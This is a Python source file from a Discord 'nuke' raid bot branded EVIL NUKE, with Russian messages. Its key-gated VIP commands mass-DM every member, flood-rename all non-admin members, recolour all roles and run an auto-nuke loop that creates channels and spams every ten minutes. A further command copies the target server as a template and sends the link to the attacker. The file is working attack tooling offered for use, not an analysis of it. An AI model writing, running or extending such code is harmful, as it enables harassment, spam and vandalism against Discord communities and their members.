import disnake
import asyncio
from datetime import datetime
from disnake.ext import commands
from aiohttp import ClientSession

from ..utils.bot_operations import Fucker
from ..utils.key_manager import key_manager
from ..utils.blacklist import is_blacklisted
from ..config.config import headers


class VIPCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.auto_nuke_tasks = {}

    async def check_vip(self, ctx):
        if ctx.guild is None:
            embed = disnake.Embed(
                title="❌ Ошибка",
                description="Эта команда работает только на сервере!",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return False

        if is_blacklisted(ctx.guild.id):
            embed = disnake.Embed(
                title="⛔ Доступ запрещён",
                description="Этот сервер в чёрном списке.",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return False

        if not key_manager.has_access(ctx.author.id):
            embed = disnake.Embed(
                title="❌ Доступ запрещён",
                description="У вас нет доступа к VIP-командам.\n"
                            "Впишите ключ в ЛС бота: `/key КЛЮЧ`",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return False
        return True

    @commands.command(name="dmall")
    async def dmall(self, ctx, *, text="EVIL NUKE | Присоединяйся к нам!"):
        """Массовая рассылка в ЛС всем участникам (VIP)"""
        if not await self.check_vip(ctx):
            return

        embed_start = disnake.Embed(
            title="📨 МАССОВАЯ РАССЫЛКА",
            description=f"Начинаю рассылку всем участникам...",
            color=disnake.Color.from_rgb(48, 49, 54)
        )
        await ctx.send(embed=embed_start)

        fucker = Fucker(ctx)
        await fucker.dm_all(ctx, text)

    @commands.command(name="nicknameflood")
    async def nicknameflood(self, ctx):
        """Менять никнеймы всех участников каждые 5 секунд (VIP)"""
        if not await self.check_vip(ctx):
            return

        embed_start = disnake.Embed(
            title="🔄 НИКНЕЙМ-ФЛУД",
            description="Начинаю менять никнеймы всех участников каждые 5 секунд!",
            color=disnake.Color.from_rgb(48, 49, 54)
        )
        await ctx.send(embed=embed_start)

        fucker = Fucker(ctx)
        names = ["Crashed By EVIL", "EVIL NUKE", "VIP CRASH", "EVIL", "NUKE"]
        import random

        for i in range(10):
            for member in ctx.guild.members:
                if member.id != ctx.bot.user.id and not member.guild_permissions.administrator:
                    try:
                        await member.edit(nick=random.choice(names) + f"_{i+1}")
                    except:
                        pass
            await asyncio.sleep(5)

        embed_end = disnake.Embed(
            title="✅ НИКНЕЙМ-ФЛУД ЗАВЕРШЁН",
            description="Было произведено 10 волн переименований!",
            color=disnake.Color.green()
        )
        await ctx.send(embed=embed_end)

    @commands.command(name="rolecolor")
    async def rolecolor(self, ctx, color: str):
        """Сменить цвет всех ролей (VIP) - red, green, black"""
        if not await self.check_vip(ctx):
            return

        colors = {
            "red": 0xFF0000,
            "green": 0x00FF00,
            "black": 0x000000
        }

        if color.lower() not in colors:
            embed = disnake.Embed(
                title="❌ Ошибка",
                description="Доступные цвета: `red`, `green`, `black`",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return

        embed_start = disnake.Embed(
            title="🎨 СМЕНА ЦВЕТА РОЛЕЙ",
            description=f"Меняю цвет всех ролей на **{color}**...",
            color=disnake.Color.from_rgb(48, 49, 54)
        )
        await ctx.send(embed=embed_start)

        fucker = Fucker(ctx)
        await fucker.role_color(ctx, color)

        embed_end = disnake.Embed(
            title="✅ ЦВЕТ РОЛЕЙ ИЗМЕНЁН",
            description=f"Все роли теперь **{color}**!",
            color=disnake.Color.green()
        )
        await ctx.send(embed=embed_end)

    @commands.command(name="autonuke")
    async def autonuke(self, ctx):
        """Авто-нук каждые 10 минут (VIP)"""
        if not await self.check_vip(ctx):
            return

        guild_id = str(ctx.guild.id)

        if guild_id in self.auto_nuke_tasks and self.auto_nuke_tasks[guild_id]:
            embed = disnake.Embed(
                title="⏹️ АВТО-НУК ОСТАНОВЛЕН",
                description="Авто-нук был остановлен.",
                color=disnake.Color.orange()
            )
            await ctx.send(embed=embed)
            self.auto_nuke_tasks[guild_id] = False
            return

        embed_start = disnake.Embed(
            title="🔄 АВТО-НУК ЗАПУЩЕН",
            description="Бот будет создавать каналы и спамить каждые 10 минут!\n"
                        "Для остановки введите `!autonuke` снова.",
            color=disnake.Color.from_rgb(48, 49, 54)
        )
        await ctx.send(embed=embed_start)

        self.auto_nuke_tasks[guild_id] = True
        fucker = Fucker(ctx)

        while self.auto_nuke_tasks[guild_id]:
            await fucker.crChannels(ctx)
            await fucker.spam(ctx)
            await asyncio.sleep(600)

    @commands.command(name="serverbackup")
    async def serverbackup(self, ctx):
        """Получить ссылку-шаблон сервера (VIP)"""
        if not await self.check_vip(ctx):
            return

        embed_start = disnake.Embed(
            title="💾 СОЗДАНИЕ ШАБЛОНА",
            description="Начинаю создание шаблона сервера...",
            color=disnake.Color.from_rgb(48, 49, 54)
        )
        await ctx.send(embed=embed_start)

        try:
            fucker = Fucker(ctx)
            
            url = f"https://discord.com/api/v9/guilds/{ctx.guild.id}/templates"
            json_data = {
                "name": f"Backup_{ctx.guild.name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
                "description": f"Бэкап сервера {ctx.guild.name} от {datetime.now().strftime('%d.%m.%Y %H:%M')}"
            }
            
            async with ClientSession(headers=fucker.headers) as session:
                async with session.post(url, json=json_data) as resp:
                    if resp.status in [200, 201]:
                        data = await resp.json()
                        template_code = data.get("code")
                        
                        if template_code:
                            template_link = f"https://discord.new/{template_code}"
                            
                            embed_dm = disnake.Embed(
                                title="💾 ШАБЛОН СЕРВЕРА",
                                description=f"**Сервер:** {ctx.guild.name}\n"
                                            f"**Ссылка:** {template_link}\n\n"
                                            f"📌 Нажмите на ссылку, чтобы создать копию сервера.\n"
                                            f"⚠️ Шаблон будет храниться 7 дней.",
                                color=disnake.Color.from_rgb(48, 49, 54)
                            )
                            embed_dm.set_footer(text="EVIL NUKE", icon_url=ctx.bot.user.display_avatar.url)
                            
                            await ctx.author.send(embed=embed_dm)
                            
                            embed_success = disnake.Embed(
                                title="✅ ШАБЛОН СОЗДАН",
                                description="Ссылка на шаблон отправлена в ЛС! 📨",
                                color=disnake.Color.green()
                            )
                            await ctx.send(embed=embed_success)
                        else:
                            raise Exception("Не удалось получить код шаблона")
                    else:
                        error_text = await resp.text()
                        raise Exception(f"Ошибка API: {resp.status}")
                        
        except Exception as e:
            embed_error = disnake.Embed(
                title="❌ ОШИБКА",
                description=f"Не удалось создать шаблон.\n"
                            f"Возможно, у бота нет прав на создание шаблонов.\n"
                            f"Ошибка: `{e}`",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed_error)


def setup(bot):
    bot.add_cog(VIPCommands(bot))